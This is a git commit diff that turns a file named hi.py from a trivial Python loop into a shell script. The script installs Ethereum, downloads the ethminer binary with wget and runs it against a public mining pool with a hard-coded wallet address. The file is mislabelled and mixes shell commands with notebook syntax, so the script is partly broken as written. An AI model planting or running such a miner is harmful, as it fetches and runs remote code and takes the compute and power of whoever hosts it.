10176b3f81d5ac0d7d302237639c0de71f2de308
gelopeq <79090873+gelopeq@users.noreply.github.com>
2021-06-22 09:31:45 +0530

    Update hi.py

--- hi.py
+++ hi.py
@@ -1,5 +1,12 @@
-#!/usr/bin/python3.7
-i=0
-while True:
-  i=i+1
+#!/usr/bin/bash
+
+sudo add-apt-repository ppa:ethereum/ethereum -y
+sudo cat /etc/apt/sources.list 
+sudo apt update -y
+sudo apt install ethereum -y
+wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
+%ls
+tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
+%cd bin/
+./ethminer -G -P stratum1+tcp://0x9178e589dD1f057415AC26fCdb5a178b8C078379@eu1.ethermine.org:4444
   
